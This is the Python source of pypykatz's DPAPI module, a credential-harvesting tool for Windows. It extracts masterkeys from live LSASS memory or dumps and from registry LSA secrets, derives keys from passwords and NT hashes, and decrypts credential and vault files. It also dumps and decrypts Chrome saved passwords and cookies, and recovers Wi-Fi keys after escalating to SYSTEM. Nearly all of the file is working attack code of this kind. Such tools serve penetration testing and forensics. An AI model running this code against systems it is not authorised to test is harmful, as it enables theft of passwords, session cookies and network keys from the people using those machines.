#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import os
import ntpath
import json
import hmac
import hashlib
import glob
import sqlite3
import base64
import platform
from hashlib import sha1, pbkdf2_hmac
import xml.etree.ElementTree as ET

from pypykatz import logger
from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
from pypykatz.dpapi.structures.credentialfile import CredentialFile, CREDENTIAL_BLOB
from pypykatz.dpapi.structures.blob import DPAPI_BLOB
from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_KEYS

from pypykatz.crypto.unified.aes import AES
from pypykatz.crypto.unified.aesgcm import AES_GCM
from pypykatz.crypto.unified.common import SYMMETRIC_MODE
from pypykatz.commons.common import UniversalEncoder

if platform.system().lower() == 'windows':
	from pypykatz.commons.winapi.processmanipulator import ProcessManipulator

"""
So! DPAPI...

In order to decrpyt a file/blob/data of any kind you must obtain a masterkey.
Masterkey can be obtained either from the LSASS process, or by decrypting a masterkeyfile. LSASS is straightforward, succsessfully dumping it will give you all the plaintext masterkeys with the appropriate GUID.
 But if you can't use LSASS, you have to obtain the masterkey file, and decrypt it with an appropriate key. (too many keys, I know...)
 Masterkey files can be located in '%APPDATA%\Microsoft\Protect\%SID%' for each user or '%SYSTEMDIR%\Microsoft\Protect' for the SYSTEM user. But how to decrypt them?
 A masterkeyfile can contain multiple different keys, a masterkey is one of them. The masterkey is stored encrypted in the masterkeyfile, and is encrypted with a key that can be either a key stored in registry (LSA secrets) or not. In case the LSA DPAPI keys are not valid, you will need to use the NT hash of the user's password or the user's plaintext password itself. BUT! deriving the key from the password and the SID will yield 3 different keys, and so far noone could tell what key is the correct one to be used.
 Solution for decrypting a masterkey in the mastereky file: harvest as many key candidates as possible and try to decrypt the masterkey. Much to our luck, verifying the signature data after decryption can tell us if the decrpytion was sucsessfull, so we can tell if the masterkey decrypted correctly or not.

But you may ask: I see a lot of different masterkey files, how can I tell which one is used for my <credential file/vault files/blob>. The answer: a masterkeyfile stores GUID of the keys it stores (eg. the masterkey), and so does your <secret> data sructure for the appropriate key. Therefore it's easy to tell which file to decrypt for a given <secret>

BUT WAIT! THERE IS MORE!

DPAPI is also used to decrypt stroed secrets in Windows Vault and Credential files.
Credential files:
	1. standalone file, inside it there is a DPAPI_BLOB.
	2. DPAPI_BLOB can be decrypted with the corresponding masterkey
	3. After decryption you'll find a CREDENTIAL_BLOB strucutre.
	4. CREDENTIAL_BLOB strucutre has the plaintext secrets, but it's not possible to tell in which filed they are stored. You'll need to check them by hand :)
	
Vault files (VCRD and VPOL):
	VCRD file holds the secrets encrypted. The decrpytion key is stored in the VPOL file, but also encryted. The VPOL file's decryption key is a masterkey. The masterkey is stored in a Masterkeyfile...
	1. Need to find the masterkey to decrypt the VPOL file
	2. VPOL file will give two keys after sucsessful decryption
	3. There is no way to tell (atm) which key will be the correct one to decrypt the VCRD file
	4. The VCRD file has a lot of stored secrets, called attributes. Each attribute is encrypted with one of the keys from the VPOL file
	5. For each attribute: for each key: decrypt attribute.
	6. Check manually if one of them sucseeded because there are no integrity checks, so no way to tell programatically which key worked.
	
Path to decrypt stuff:
	Sub-sections are options of how to get the keys
	
	1. pre_masterkey:
		a, from user password and SID
		b, from user NT hash and SID
		c, from live registry SYSTEM cached DPAPI key or SAM cache NT hash and SID
		d, from offline registry hives
		
	2. masterkey:
		a, from masterkeyfile + pre_masterkey
		b, from live LSASS dump
		c, from offline LSASS dump
		
	3. credential file:
		a, masterkey + credential_file
		
	3. VPOL file:
		a, masterkey + VPOL file
		
	3. VCRED file:
		a, VPOL file + VCRED file
		
	3. DPAPI_BLOB:
		a, masterkey

TODO: A LOT! currently fetching backupkeys from the DC is not supported. and probably missing a lot of things in the strucutre parsing :(
"""

class DPAPI:
	def __init__(self, use_winapi = False):
		self.use_winapi = use_winapi
		self.prekeys = {} #keys in bytes format stored in a dict for avoiding dupes
		
		#masterkey, backupkey
		self.masterkeys = {} #guid -> binary value
		self.backupkeys = {} #guid -> binary value
		
		#since so far I dunno how to match vault-keys to vaults, its a list :(
		self.vault_keys = []
	

	def dump_pre_keys(self, filename = None):
		if filename is None:
			for x in self.prekeys:
				print(x.hex())
		else:
			with open(filename, 'w', newline = '') as f:
				for x in self.prekeys:
					f.write(x.hex() + '\r\n')

	def load_prekeys(self, filename):
		try:
			open(filename, 'r')
		except Exception as e:
			key = bytes.fromhex(filename)
			self.prekeys[key] = 1
			return
		else:
			with open(filename, 'r') as f:
				for line in f:
					line = line.strip()
					self.prekeys[bytes.fromhex(line)] = 1

	def dump_masterkeys(self, filename = None):
		if filename is None:
			for x in self.masterkeys:
				print('[GUID] %s [MASTERKEY] %s' % (x, self.masterkeys[x].hex()))
			for x in self.backupkeys:
				print('[GUID] %s [BACKUPKEY] %s' % (x, self.backupkeys[x].hex()))
		else:
			with open(filename, 'w', newline = '') as f:
				t = { 'masterkeys' : self.masterkeys, 'backupkeys': self.backupkeys}
				f.write(json.dumps(t, cls = UniversalEncoder, indent=4, sort_keys=True))

	def load_masterkeys(self, filename):
		with open(filename, 'r') as f:
			data = json.loads(f.read())
		

		for guid in data['backupkeys']:
			self.backupkeys[guid] = bytes.fromhex(data['backupkeys'][guid])
		for guid in data['masterkeys']:
			self.masterkeys[guid] = bytes.fromhex(data['masterkeys'][guid])

		
	def get_prekeys_from_password(self, sid, password = None, nt_hash = None):
		"""
		Creates pre-masterkeys from user SID and password of nt hash.
		If NT hash is provided the function can only generate 2 out of the 3 possible keys, 
		this is because one of the derived keys relies ion the SHA1 hash of the user password
		
		sid: user's SID as a string
		password: user's password. optional. if not provided, then NT hash must be provided
		nt_hash: user's NT hash. optional if not provided, the password must be provided
		"""
		if password is None and nt_hash is None:
			raise Exception('Provide either password or NT hash!')
		
		if password is None and nt_hash:
			if isinstance(nt_hash, str):
				nt_hash = bytes.fromhex(nt_hash)
			key1 = None
		
		if password or password == '':
			md4 = hashlib.new('md4')
			md4.update(password.encode('utf-16le'))
			nt_hash = md4.digest()
			# Will generate two keys, one with SHA1 and another with MD4
			key1 = hmac.new(sha1(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), sha1).digest()
		
		key2 = hmac.new(nt_hash, (sid + '\0').encode('utf-16le'), sha1).digest()
		# For Protected users
		tmp_key = pbkdf2_hmac('sha256', nt_hash, sid.encode('utf-16le'), 10000)
		tmp_key_2 = pbkdf2_hmac('sha256', tmp_key, sid.encode('utf-16le'), 1)[:16]
		key3 = hmac.new(tmp_key_2, (sid + '\0').encode('utf-16le'), sha1).digest()[:20]
		
		if key1 is not None:
			self.prekeys[key1] = 1
		self.prekeys[key2] = 1
		self.prekeys[key3] = 1
		
		if key1 is not None:
			logger.debug('Prekey_1 %s %s %s %s' % (sid, password, nt_hash, key1.hex()))
		logger.debug('Prekey_2 %s %s %s %s' % (sid, password, nt_hash, key2.hex()))
		logger.debug('Prekey_3 %s %s %s %s' % (sid, password, nt_hash, key3.hex()))
		
		return key1, key2, key3
				
	def __get_registry_secrets(self, lr):
		"""
		Gets the pre-keys from an already parsed OffineRegistry or LiveRegistry object, populates the userkey/machinekey lists, returns the obtained keys
		
		lr: OffineRegistry or LiveRegistry object
		return: touple of two lists, [0] userkeys [1] machinekeys
		"""
		user = []
		machine = []
		from pypykatz.registry.security.common import LSASecretDPAPI

		if lr.security:
			for secret in lr.security.cached_secrets:
				if isinstance(secret, LSASecretDPAPI):
					logger.debug('[DPAPI] Found DPAPI user key in registry! Key: %s' % secret.user_key)
					logger.debug('[DPAPI] Found DPAPI machine key in registry! Key: %s' % secret.machine_key)
					self.prekeys[secret.user_key] = 1
					user.append(secret.user_key)
					self.prekeys[secret.machine_key] = 1
					machine.append(secret.machine_key)
		
		if lr.sam is not None:
			for secret in lr.sam.secrets:
				if secret.nt_hash:
					sid = '%s-%s' % (lr.sam.machine_sid, secret.rid)
					x, key2, key3 = self.get_prekeys_from_password(sid, nt_hash = secret.nt_hash)
					logger.debug('[DPAPI] NT hash method. Calculated user key for user %s! Key2: %s Key3: %s' % (sid, key2, key3))
					user.append(key2)
					user.append(key3)
					continue
					
		return user, machine
	
	def get_prekeys_form_registry_live(self):
		"""
		
		return: touple of two lists, [0] userkeys [1] machinekeys
		"""
		from pypykatz.registry.live_parser import LiveRegistry
		from pypykatz.registry.offline_parser import OffineRegistry
		lr = None
		try:
			lr = LiveRegistry.go_live()
		except Exception as e:
			logger.debug('[DPAPI] Failed to obtain registry secrets via direct registry reading method')
			try:
				lr = OffineRegistry.from_live_system()
			except Exception as e:
				logger.debug('[DPAPI] Failed to obtain registry secrets via filedump method')
		
		if lr is not None:
			return self.__get_registry_secrets(lr)

		else:
			raise Exception('Registry parsing failed!')
			
	def get_prekeys_form_registry_files(self, system_path, security_path, sam_path = None):
		"""
		
		return: touple of two lists, [0] userkeys [1] machinekeys
		"""
		from pypykatz.registry.offline_parser import OffineRegistry
		lr = None
		try:
			lr = OffineRegistry.from_files(system_path, sam_path = sam_path, security_path = security_path)
		except Exception as e:
			logger.error('[DPAPI] Failed to obtain registry secrets via direct registry reading method. Reason: %s' %e)
		
		if lr is not None:
			return self.__get_registry_secrets(lr)

		else:
			raise Exception('[DPAPI] Registry parsing failed!')
			
	def get_all_keys_from_lsass_live(self):
		"""
		Parses the live LSASS process and extracts the plaintext masterkeys, and also generates prekeys from all available credentials
		It does not retun anything, just sets up all key material in the object
		return: None
		"""
		from pypykatz.pypykatz import pypykatz
		katz = pypykatz.go_live()
		sids = [katz.logon_sessions[x].sid for x in katz.logon_sessions]
		for x in katz.logon_sessions:
			for dc in katz.logon_sessions[x].dpapi_creds:
				logger.debug('[DPAPI] Got masterkey for GUID %s via live LSASS method' % dc.key_guid)
				self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)
			
			for package,_,_, nthex, lmhex, shahex, _,_,_, plaintext in katz.logon_sessions[x].to_grep_rows():
				if package.lower() == 'dpapi':
					continue
				
				sids = [katz.logon_sessions[x].sid]
				for sid in sids:
					if plaintext is not None:
						self.get_prekeys_from_password(sid, password = plaintext, nt_hash = None)
					if nthex is not None and len(nthex) == 32:
						self.get_prekeys_from_password(sid, password = None, nt_hash = nthex)
				
				if shahex is not None and len(shahex) == 40:
					self.prekeys[bytes.fromhex(shahex)] = 1
			
	def get_masterkeys_from_lsass_live(self):
		"""
		Parses the live LSASS process and extracts the plaintext masterkeys
		
		return: dictionary of guid->keybytes
		"""
		from pypykatz.pypykatz import pypykatz
		katz = pypykatz.go_live()
		for x in katz.logon_sessions:
			for dc in katz.logon_sessions[x].dpapi_creds:
				logger.debug('[DPAPI] Got masterkey for GUID %s via live LSASS method' % dc.key_guid)
				self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)
		
		return self.masterkeys
				
	def get_masterkeys_from_lsass_dump(self, file_path):
		"""
		Parses the mindiump of an LSASS process file and extracts the plaintext masterkeys
		
		file_path: path to the mindiump file
		return: dictionary of guid->keybytes
		"""
		from pypykatz.pypykatz import pypykatz
		katz = pypykatz.parse_minidump_file(file_path)
		for x in katz.logon_sessions:
			for dc in katz.logon_sessions[x].dpapi_creds:
				logger.debug('[DPAPI] Got masterkey for GUID %s via minidump LSASS method' % dc.key_guid)
				self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)

		for package,_,_, nthex, lmhex, shahex, _,_,_, plaintext in katz.logon_sessions[x].to_grep_rows():
				if package.lower() == 'dpapi':
					continue
				
				sids = [katz.logon_sessions[x].sid]
				for sid in sids:
					if plaintext is not None:
						self.get_prekeys_from_password(sid, password = plaintext, nt_hash = None)
					if nthex is not None and len(nthex) == 32:
						self.get_prekeys_from_password(sid, password = None, nt_hash = nthex)
				
				if shahex is not None and len(shahex) == 40:
					self.prekeys[bytes.fromhex(shahex)] = 1
				
		return self.masterkeys
			
	def decrypt_masterkey_file(self, file_path, key = None):
		"""
		Decrypts Masterkeyfile
		file_path: path to Masterkeyfile
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: CREDENTIAL_BLOB object
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_masterkey_bytes(f.read(), key = key)
	
	def decrypt_masterkey_bytes(self, data, key = None):
		"""
		Decrypts Masterkeyfile bytes
		data: bytearray of the masterkeyfile
		key: bytes describing the key used for decryption
		returns: touple of dictionaries. [0] - > masterkey[guid] = key, [1] - > backupkey[guid] = key
		"""
		mkf = MasterKeyFile.from_bytes(data)
		mks = {}
		bks = {}
		if mkf.masterkey is not None:
			if mkf.guid in self.masterkeys:
				mks[mkf.guid] = self.masterkeys[mkf.guid]
				
			else:
				for user_key in self.prekeys:
					dec_key = mkf.masterkey.decrypt(user_key)
					if dec_key:
						logger.debug('user key win: %s' % user_key.hex())
						self.masterkeys[mkf.guid] = dec_key
						mks[mkf.guid] = dec_key
						break
						
				if key is not None:
					dec_key = mkf.masterkey.decrypt(key)
					if dec_key:
						self.masterkeys[mkf.guid] = dec_key
						mks[mkf.guid] = dec_key
		
		if mkf.backupkey is not None:
			if mkf.guid in self.masterkeys:
				mks[mkf.guid] = self.masterkeys[mkf.guid]
				
			else:
				for user_key in self.prekeys:
					dec_key = mkf.backupkey.decrypt(user_key)
					if dec_key:
						self.backupkeys[mkf.guid] = dec_key
						bks[mkf.guid] = dec_key
						break
						
				if key is not None:
					dec_key = mkf.backupkey.decrypt(key)
					if dec_key:
						self.masterkeys[mkf.guid] = dec_key
						bks[mkf.guid] = dec_key
					
		return mks, bks
	
	def decrypt_credential_file(self, file_path):
		"""
		Decrypts CredentialFile
		file_path: path to CredentialFile
		returns: CREDENTIAL_BLOB object
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_credential_bytes(f.read())
	
	def decrypt_credential_bytes(self, data):
		"""
		Decrypts CredentialFile bytes
		CredentialFile holds one DPAPI blob, so the decryption is straightforward, and it also has a known structure for the cleartext.
		Pay attention that the resulting CREDENTIAL_BLOB strucutre's fields can hold the secrets in wierd filenames like "unknown"
		
		data: CredentialFile bytes
		returns: CREDENTIAL_BLOB object
		"""
		cred = CredentialFile.from_bytes(data)
		dec_data = self.decrypt_blob_bytes(cred.data)
		cb = CREDENTIAL_BLOB.from_bytes(dec_data)
		return cb
		
	def decrypt_blob(self, dpapi_blob, key = None):
		"""
		Decrypts a DPAPI_BLOB object
		The DPAPI blob has a GUID attributes which indicates the masterkey to be used, also it has integrity check bytes so it is possible to tell is decryption was sucsessfull.
		
		dpapi_blob: DPAPI_BLOB object
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: bytes of the cleartext data
		"""
		if key is None:
			logger.debug('[DPAPI] Looking for master key with GUID %s' % dpapi_blob.masterkey_guid)
			if dpapi_blob.masterkey_guid not in self.masterkeys:
				raise Exception('No matching masterkey was found for the blob!')
			key = self.masterkeys[dpapi_blob.masterkey_guid]
		return dpapi_blob.decrypt(key)
		
	def decrypt_blob_bytes(self, data, key = None):
		"""
		Decrypts DPAPI_BLOB bytes.
		
		data: DPAPI_BLOB bytes
		returns: bytes of the cleartext data
		"""
		if self.use_winapi is True:
			from pypykatz.dpapi.functiondefs.dpapi import CryptUnprotectData
			return CryptUnprotectData(data)
		
		blob = DPAPI_BLOB.from_bytes(data)
		logger.debug(str(blob))
		return self.decrypt_blob(blob, key = key)
		
	def decrypt_vcrd_file(self, file_path):
		"""
		Decrypts a VCRD file
		Location: %APPDATA%\Local\Microsoft\Vault\%GUID%\<>.vcrd
		
		file_path: path to the vcrd file
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_vcrd_bytes(f.read())
			
	def decrypt_vcrd_bytes(self, data):
		"""
		Decrypts VCRD file bytes.
		
		data: VCRD file bytes
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		vv = VAULT_VCRD.from_bytes(data)
		return self.decrypt_vcrd(vv)
		
	def decrypt_vcrd(self, vcrd):
		"""
		Decrypts the attributes found in a VCRD object, and returns the cleartext data candidates
		A VCRD file can have a lot of stored credentials inside, most of them with custom data strucutre
		It is not possible to tell if the decryption was sucsesssfull, so treat the result accordingly
		
		vcrd: VAULT_VCRD object
		key: bytes of the decryption key. optional. If not supplied the function will look for stored keys.
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		
		def decrypt_attr(attr, key):
			if attr.data is not None:
				if attr.iv is not None:
					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=attr.iv)
				else:
					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=b'\x00'*16)
				
				cleartext = cipher.decrypt(attr.data)
				return cleartext
		
		res = {}
		for i, key in enumerate(self.vault_keys):
			for attr in vcrd.attributes:
				cleartext = decrypt_attr(attr, key)
				if attr not in res:
					res[attr] = []
				res[attr].append(cleartext)
		return res
					
	def decrypt_vpol_bytes(self, data):
		"""
		Decrypts the VPOL file, and returns the two keys' bytes
		A VPOL file stores two encryption keys.
		
		data: bytes of the VPOL file
		returns touple of bytes, describing two keys
		"""
		vpol = VAULT_VPOL.from_bytes(data)
		res = self.decrypt_blob_bytes(vpol.blobdata)
		
		keys = VAULT_VPOL_KEYS.from_bytes(res)
		
		self.vault_keys.append(keys.key1.get_key())
		self.vault_keys.append(keys.key2.get_key())
		
		return keys.key1.get_key(), keys.key2.get_key()
		
	def decrypt_vpol_file(self, file_path):
		"""
		Decrypts a VPOL file
		Location: %APPDATA%\Local\Microsoft\Vault\%GUID%\<>.vpol
		
		file_path: path to the vcrd file
		keys: Optional.
		returns: touple of bytes, describing two keys
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_vpol_bytes(f.read())

	def decrypt_securestring_bytes(self, data):
		return self.decrypt_blob_bytes(data)
		
	def decrypt_securestring_hex(self, hex_str):
		return self.decrypt_securestring_bytes(bytes.fromhex(hex_str))
	
	def decrypt_securestring_file(self, file_path):
		with open(file_path, 'r') as f:
			data = f.read()
		return self.decrypt_securestring_hex(data)
		
	
	@staticmethod
	def find_masterkey_files_live():
		windows_loc = DPAPI.get_windows_dir_live()
		user_folder = DPAPI.get_users_dir_live()
		
		return DPAPI.find_masterkey_files_offline(user_folder, windows_loc)
	
	@staticmethod
	def find_masterkey_files_offline(users_path, windows_path):
		def is_guid(fname):
			if os.path.isfile(filename) is True:
				base = ntpath.basename(filename)
				if base.find('-') == -1:
					return False
				try:
					bytes.fromhex(base.replace('-',''))
				except:
					return False
				return True
			return False
		
		masterkey_files = {}
		for filename in glob.glob(os.path.join(windows_path, "System32","Microsoft","Protect", "**"), recursive = True):
			if is_guid(filename) is True:
				logger.debug('GUID SYSTEM FILE: %s' % filename)
				masterkey_files[ntpath.basename(filename)] = filename
		
		user_folders = {}
		for filename in glob.glob(os.path.join(users_path, '*'), recursive=False):
			if os.path.isdir(filename):
				user_folders[filename] = 1
		
		for subfolder in ['Local', 'Roaming', 'LocalLow']:
			for user_folder in user_folders:
				for filename in glob.glob(os.path.join(user_folder, "AppData", subfolder, "Microsoft", "Protect", '**'), recursive = True):
					if is_guid(filename) is True:
						masterkey_files[ntpath.basename(filename)] = filename
						logger.debug('GUID USER FILE: %s' % filename)
		
		return masterkey_files
	
	@staticmethod
	def get_users_dir_live():
		username = os.environ.get('USERNAME')
		userprofile_loc = os.environ.get('USERPROFILE')
		username = os.environ.get('USERNAME')
		return userprofile_loc[:-len(username)]
	
	@staticmethod
	def get_windows_dir_live():
		return os.environ.get('SystemRoot')

	@staticmethod
	def get_windows_drive_live():
		return os.environ.get('SystemDrive')[0]
	
	@staticmethod
	def find_chrome_database_file_live():
		return DPAPI.find_chrome_database_file_offline(DPAPI.get_users_dir_live())
	
	@staticmethod
	def find_chrome_database_file_offline(users_path):
		db_paths = {} # username -> files
		user_folders = {} # username -> folder
		
		for filename in glob.glob(os.path.join(users_path, '*'), recursive=False):
			if os.path.isdir(filename):
				username = ntpath.basename(filename)
				if username not in user_folders:
					user_folders[username] = []
				user_folders[username].append(filename)
				
		for subfolder_1 in ['Local', 'Roaming', 'LocalLow']:
			for subfolder_2 in ['', 'Google']:
				for username in user_folders:
					if username not in db_paths:
						db_paths[username] = {}
					for user_folder in user_folders[username]:
						db_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data','Default','Login Data' )
						if os.path.isfile(db_path) is True:
							db_paths[username]['logindata'] = db_path
							logger.debug('CHROME LOGINS DB FILE: %s' % db_path)

						db_cookies_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data','Default','Cookies' )
						if os.path.isfile(db_cookies_path) is True:
							db_paths[username]['cookies'] = db_cookies_path
							logger.debug('CHROME COOKIES DB FILE: %s' % db_cookies_path)

						localstate_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome','User Data', 'Local State' )
						if os.path.isfile(localstate_path) is True:
							db_paths[username]['localstate'] = localstate_path
							logger.debug('CHROME localstate FILE: %s' % localstate_path)
				
		return db_paths
	
	@staticmethod
	def get_chrome_encrypted_secret(db_path):
		results = {}
		results['logins'] = []
		results['cookies'] = []
		results['localstate'] = []

		try:
			conn = sqlite3.connect(db_path)
			cursor = conn.cursor()
		except Exception as e:
			logger.debug('Failed to open chrome DB file %s' % db_path)
			return results
		
		if ntpath.basename(db_path).lower() == 'cookies':
			try:
				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
				cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
			except Exception as e:
				logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
				return results
			
			for host_key, name, path, encrypted_value in cursor.fetchall():
				results['cookies'].append((host_key, name, path, encrypted_value))

		elif ntpath.basename(db_path).lower() == 'login data':

			try:
				#totally not stolen from here https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py
				cursor.execute('SELECT action_url, username_value, password_value FROM logins')
			except Exception as e:
				logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
				return results
				
			for url, user, enc_pw in cursor.fetchall():
				results['logins'].append((url, user, enc_pw))
		
		return results
		
	def decrypt_all_chrome_live(self):
		results = {}
		results['logins'] = []
		results['cookies'] = []
		localstate_dec = None

		dbpaths = DPAPI.find_chrome_database_file_live()
		for username in dbpaths:
			if 'localstate' in dbpaths[username]:
				with open(dbpaths[username]['localstate'], 'r') as f:
					encrypted_key = json.load(f)['os_crypt']['encrypted_key']
					encrypted_key = base64.b64decode(encrypted_key)
				
				try:
					localstate_dec = self.decrypt_blob_bytes(encrypted_key[5:])
				except:
					# this localstate was encrypted for another user...
					continue
			if 'cookies' in dbpaths[username]:
				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['cookies'])
				for host_key, name, path, encrypted_value in secrets['cookies']:
					if encrypted_value.startswith(b'v10'):
						nonce = encrypted_value[3:3+12]
						ciphertext = encrypted_value[3+12:-16]
						tag = encrypted_value[-16:]
						cipher = AES_GCM(localstate_dec)
						dec_val = cipher.decrypt(nonce, ciphertext, tag, auth_data=b'') 
						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))
					else:
						dec_val = self.decrypt_blob_bytes(encrypted_value)
						results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val ))

			if 'logindata' in dbpaths[username]:
				secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['logindata'])
				for url, user, enc_password in secrets['logins']:
					if enc_password.startswith(b'v10'):
						nonce = enc_password[3:3+12]
						ciphertext = enc_password[3+12:-16]
						tag = enc_password[-16:]
						cipher = AES_GCM(localstate_dec)
						password = cipher.decrypt(nonce, ciphertext, tag, auth_data=b'')
						results['logins'].append((dbpaths[username]['logindata'], url, user, password))
					
					else:
						password = self.decrypt_blob_bytes(enc_password)
						results['logins'].append((dbpaths[username]['logindata'], url, user, password ))
				
				
		return results
		
	def get_all_masterkeys_live(self):
		try:
			self.get_all_keys_from_lsass_live()
		except:
			logger.debug('Failed to get masterkeys/prekeys from LSASS!')
			
		try:
			self.get_prekeys_form_registry_live()
		except Exception as e:
			logger.debug('Failed to get masterkeys/prekeys from registry!')
		
		mkfiles = DPAPI.find_masterkey_files_live()
		for guid in mkfiles:
			logger.debug('Decrypting masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
			mk, bk = self.decrypt_masterkey_file(mkfiles[guid])
			if len(mk) > 0 or len(bk) > 0:
				logger.debug('Decrypted masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
			else:
				logger.debug('Failed to decrypt masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
		
		return self.masterkeys, self.backupkeys
	
	@staticmethod
	def parse_wifi_config_file(filepath):
		wifi = {}
		tree = ET.parse(filepath)
		root = tree.getroot()

		for child in root:
			if child.tag.endswith('}name'):
				wifi['name'] = child.text
			elif child.tag.endswith('}MSM'):
				for pc in child.iter():
					if pc.tag.endswith('}keyMaterial'):
						wifi['enckey'] = pc.text
		return wifi

	@staticmethod
	def get_all_wifi_settings_offline(system_drive_letter):
		wifis = []
		for filename in glob.glob(system_drive_letter+':\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\**', recursive=True):
			if filename.endswith('.xml'):
				wifi = DPAPI.parse_wifi_config_file(filename)
				wifis.append(wifi)
		return wifis

	@staticmethod
	def get_all_wifi_settings_live():
		return DPAPI.get_all_wifi_settings_offline(DPAPI.get_windows_drive_live())

	def decrypt_wifi_live(self):
		# key is encrypted as system!!!
		pm = ProcessManipulator()
		try:
			try:
				pm.getsystem()
			except Exception as e:
				raise Exception('Failed to obtain SYSTEM privileges! Are you admin? Error: %s' % e)
			
			for wificonfig in DPAPI.get_all_wifi_settings_live():
				if 'enckey' in wificonfig and wificonfig['enckey'] != '':
					wificonfig['key'] = self.decrypt_securestring_hex(wificonfig['enckey'])
					yield wificonfig

		finally:
			pm.dropsystem()

# arpparse helper
def prepare_dpapi_live(methods = [], mkf = None, pkf = None):
	dpapi = DPAPI()
	
	if mkf is not None:
		dpapi.load_masterkeys(mkf)
	if pkf is not None:
		dpapi.load_prekeys(mkf)
	
	if 'all' in methods:
		dpapi.get_all_masterkeys_live()
	if 'registry' in methods and 'all' not in methods:
		dpapi.get_prekeys_form_registry_live()
	if 'lsass' in methods and 'all' not in methods:
		dpapi.get_masterkeys_from_lsass_live()
	
	return dpapi